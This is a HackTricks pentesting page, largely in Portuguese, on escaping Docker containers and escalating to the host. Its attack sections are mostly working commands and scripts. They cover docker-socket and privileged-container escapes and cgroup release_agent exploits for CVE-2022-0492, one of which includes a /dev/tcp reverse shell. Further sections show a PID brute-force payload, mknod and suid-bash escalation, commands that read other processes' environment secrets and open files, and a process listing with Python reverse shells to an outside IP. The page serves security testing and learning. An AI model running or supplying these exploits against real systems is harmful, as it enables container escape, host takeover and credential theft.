# Docker Breakout / Escalada de Privilégios

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.io/) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Enumeração e Escape Automáticos

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Também pode **enumerar containers**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Essa ferramenta é bastante **útil para enumerar o container em que você está e até mesmo tentar escapar automaticamente**
* [**amicontained**](https://github.com/genuinetools/amicontained): Ferramenta útil para obter os privilégios que o container possui para encontrar maneiras de escapar dele
* [**deepce**](https://github.com/stealthcopter/deepce): Ferramenta para enumerar e escapar de containers
* [**grype**](https://github.com/anchore/grype): Obtenha as CVEs contidas no software instalado na imagem

## Escape do Docker Socket Montado

Se de alguma forma você descobrir que o **socket do docker está montado** dentro do container do docker, você poderá escapar dele.\
Isso geralmente acontece em containers do docker que, por algum motivo, precisam se conectar ao daemon do docker para realizar ações.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
Neste caso, você pode usar comandos regulares do docker para se comunicar com o daemon do docker:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
Caso o **socket do docker esteja em um local inesperado**, você ainda pode se comunicar com ele usando o comando **`docker`** com o parâmetro **`-H unix:///caminho/para/docker.sock`**
{% endhint %}

O daemon do Docker também pode estar [ouvindo em uma porta (por padrão 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ou, em sistemas baseados no Systemd, a comunicação com o daemon do Docker pode ocorrer através do socket do Systemd `fd://`.

{% hint style="info" %}
Além disso, preste atenção nos sockets de tempo de execução de outras plataformas de alto nível:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Escapando do Abuso de Capacidades

Você deve verificar as capacidades do contêiner, se ele tiver alguma das seguintes, você pode ser capaz de escapar dele: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Você pode verificar as capacidades do contêiner atualmente usando as **ferramentas automáticas mencionadas anteriormente** ou:
```bash
capsh --print
```
Na seguinte página, você pode aprender mais sobre as **capacidades do Linux** e como abusá-las para escapar/elevar privilégios:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Escapando de Containers com Privilégios

Um container com privilégios pode ser criado com a flag `--privileged` ou desabilitando defesas específicas:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Montar /dev`

A flag `--privileged` introduz preocupações significativas de segurança, e a exploração depende de lançar um container docker com ela habilitada. Ao usar essa flag, os containers têm acesso total a todos os dispositivos e não possuem restrições do seccomp, AppArmor e das capacidades do Linux. Você pode **ler todos os efeitos de `--privileged`** nesta página:

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Privileged + hostPID

Com essas permissões, você pode simplesmente **mover-se para o namespace de um processo em execução no host como root**, como o init (pid:1), apenas executando: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Teste isso em um container executando:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privilégios

Apenas com a flag de privilégio, você pode tentar **acessar o disco do host** ou tentar **escapar abusando do release\_agent ou de outras formas de escape**.

Teste as seguintes formas de bypass em um container executando:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montando Disco - Poc1

Contêineres do Docker bem configurados não permitirão comandos como **fdisk -l**. No entanto, em um comando Docker mal configurado onde a flag `--privileged` ou `--device=/dev/sda1` com caps é especificada, é possível obter privilégios para visualizar a unidade do host.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Portanto, para assumir o controle da máquina host, é trivial:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
E voilà! Agora você pode acessar o sistema de arquivos do host porque ele está montado na pasta `/mnt/hola`.

#### Montando Disco - Poc2

Dentro do contêiner, um invasor pode tentar obter acesso adicional ao sistema operacional do host subjacente por meio de um volume hostPath gravável criado pelo cluster. Abaixo estão algumas coisas comuns que você pode verificar dentro do contêiner para ver se você aproveita esse vetor de ataque:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Fuga de privilégios abusando do release\_agent existente ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="PoC Inicial" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Fuga de privilégios abusando do release_agent criado ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Segundo PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Encontre uma **explicação da técnica** em:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Fuga de privilégios abusando do release\_agent sem conhecer o caminho relativo - PoC3

Nos exploits anteriores, o **caminho absoluto do contêiner dentro do sistema de arquivos do host é revelado**. No entanto, nem sempre é esse o caso. Em situações em que você **não conhece o caminho absoluto do contêiner dentro do host**, você pode usar esta técnica:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Executar o PoC dentro de um contêiner privilegiado deve fornecer uma saída semelhante a:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Fuga de privilégios abusando de montagens sensíveis

Existem vários arquivos que podem ser montados e fornecer informações sobre o host subjacente. Alguns deles podem até indicar algo a ser executado pelo host quando algo acontece (o que permitirá que um invasor escape do contêiner).\
O abuso desses arquivos pode permitir que:

* release\_agent (já abordado anteriormente)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

No entanto, você pode encontrar **outros arquivos sensíveis** para verificar nesta página:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Montagens arbitrárias

Em várias ocasiões, você descobrirá que o **contêiner possui algum volume montado do host**. Se esse volume não estiver configurado corretamente, você poderá **acessar/modificar dados sensíveis**: ler segredos, alterar chaves autorizadas do SSH...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Escalação de privilégios com 2 shells e montagem do host

Se você tem acesso como **root dentro de um contêiner** que possui uma pasta do host montada e conseguiu **escapar como um usuário não privilegiado para o host** e tem acesso de leitura sobre a pasta montada.\
Você pode criar um **arquivo bash suid** na **pasta montada** dentro do **contêiner** e **executá-lo a partir do host** para realizar a escalada de privilégios.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Escalação de privilégios com 2 shells

Se você tem acesso como **root dentro de um contêiner** e conseguiu **escapar como um usuário não privilegiado para o host**, você pode abusar de ambos os shells para **escalar privilégios dentro do host** se tiver a capacidade MKNOD dentro do contêiner (que é padrão), conforme [**explicado neste post**](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Com essa capacidade, o usuário root dentro do contêiner tem permissão para **criar arquivos de dispositivo de bloco**. Arquivos de dispositivo são arquivos especiais usados para **acessar hardware subjacente e módulos do kernel**. Por exemplo, o arquivo de dispositivo de bloco /dev/sda dá acesso para **ler os dados brutos no disco do sistema**.

O Docker garante que os dispositivos de bloco **não possam ser abusados de dentro do contêiner** definindo uma política de cgroup no contêiner que bloqueia a leitura e gravação de dispositivos de bloco.\
No entanto, se um dispositivo de bloco for **criado dentro do contêiner, ele pode ser acessado** através da pasta /proc/PID/root/ por alguém **fora do contêiner**, com a limitação de que o **processo deve ser de propriedade do mesmo usuário** fora e dentro do contêiner.

Exemplo de **exploração** deste [**relatório**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Se você conseguir acessar os processos do host, você será capaz de acessar muitas informações sensíveis armazenadas nesses processos. Execute o laboratório de teste:
```
docker run --rm -it --pid=host ubuntu bash
```
Por exemplo, você poderá listar os processos usando algo como `ps auxn` e procurar por detalhes sensíveis nos comandos.

Em seguida, como você pode **acessar cada processo do host em /proc/, você pode simplesmente roubar seus segredos de ambiente** executando:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Você também pode **acessar os descritores de arquivo de outros processos e ler os arquivos abertos por eles**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Você também pode **encerrar processos e causar um DoS**.

{% hint style="warning" %}
Se, de alguma forma, você tiver **acesso privilegiado a um processo fora do contêiner**, você pode executar algo como `nsenter --target <pid> --all` ou `nsenter --target <pid> --mount --net --pid --cgroup` para **executar um shell com as mesmas restrições de namespace** (esperançosamente nenhuma) **daquele processo**.
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Se um contêiner for configurado com o driver de rede do Docker [host (`--network=host`)](https://docs.docker.com/network/host/), a pilha de rede desse contêiner não está isolada do host do Docker (o contêiner compartilha o namespace de rede do host) e o contêiner não recebe seu próprio endereço IP alocado. Em outras palavras, o **contêiner vincula todos os serviços diretamente ao IP do host**. Além disso, o contêiner pode **interceptar TODO o tráfego de rede que o host** está enviando e recebendo na interface compartilhada `tcpdump -i eth0`.

Por exemplo, você pode usar isso para **capturar e até mesmo falsificar o tráfego** entre o host e a instância de metadados.

Como nos exemplos a seguir:

* [Writeup: Como entrar em contato com o Google SRE: Obtendo acesso a um shell no Cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [MITM do serviço de metadados permite escalonamento de privilégios de root (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Você também poderá acessar **serviços de rede vinculados ao localhost** dentro do host ou até mesmo acessar as **permissões de metadados do nó** (que podem ser diferentes das que um contêiner pode acessar).

### hostIPC
```
docker run --rm -it --ipc=host ubuntu bash
```
Se você tiver apenas `hostIPC=true`, provavelmente não poderá fazer muito. Se algum processo no host ou qualquer processo em outro pod estiver usando os **mecanismos de comunicação interprocessual** do host (memória compartilhada, arrays de semáforos, filas de mensagens, etc.), você poderá ler/escrever nesses mesmos mecanismos. O primeiro lugar que você vai querer verificar é `/dev/shm`, pois ele é compartilhado entre qualquer pod com `hostIPC=true` e o host. Você também vai querer verificar os outros mecanismos IPC com `ipcs`.

* **Inspecione /dev/shm** - Procure por quaisquer arquivos neste local de memória compartilhada: `ls -la /dev/shm`
* **Inspecione as instalações IPC existentes** - Você pode verificar se alguma instalação IPC está sendo usada com `/usr/bin/ipcs`. Verifique com: `ipcs -a`

### Recupere as capacidades

Se a chamada de sistema **`unshare`** não estiver proibida, você pode recuperar todas as capacidades executando:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Abuso de namespace de usuário via symlink

A segunda técnica explicada no post [https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indica como você pode abusar de bind mounts com namespaces de usuário para afetar arquivos dentro do host (neste caso específico, excluir arquivos).

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.io/) para construir e automatizar facilmente fluxos de trabalho com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Exploração do Runc (CVE-2019-5736)

Caso você possa executar `docker exec` como root (provavelmente com sudo), você pode tentar elevar privilégios escapando de um contêiner abusando do CVE-2019-5736 (exploit [aqui](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Essa técnica basicamente irá **sobrescrever** o binário _**/bin/sh**_ do **host** **a partir de um contêiner**, então qualquer pessoa que execute o docker exec pode acionar a carga útil.

Altere a carga útil conforme necessário e compile o main.go com `go build main.go`. O binário resultante deve ser colocado no contêiner do Docker para execução.\
Ao executar, assim que exibir `[+] Overwritten /bin/sh successfully`, você precisa executar o seguinte no host:

`docker exec -it <nome-do-contêiner> /bin/sh`

Isso acionará a carga útil presente no arquivo main.go.

Para mais informações: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Existem outras CVEs às quais o contêiner pode estar vulnerável, você pode encontrar uma lista em [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Docker Custom Escape

### Superfície de Escape do Docker

* **Namespaces:** O processo deve estar **completamente separado de outros processos** por meio de namespaces, para que não possamos escapar interagindo com outros processos devido aos namespaces (por padrão, não é possível se comunicar via IPCs, unix sockets, serviços de rede, D-Bus, `/proc` de outros processos).
* **Usuário root**: Por padrão, o usuário que executa o processo é o usuário root (no entanto, seus privilégios são limitados).
* **Capacidades**: O Docker deixa as seguintes capacidades: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalls**: Essas são as syscalls que o **usuário root não poderá chamar** (por falta de capacidades + Seccomp). As outras syscalls podem ser usadas para tentar escapar.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% tab title="chamadas de sistema arm64" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)



<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
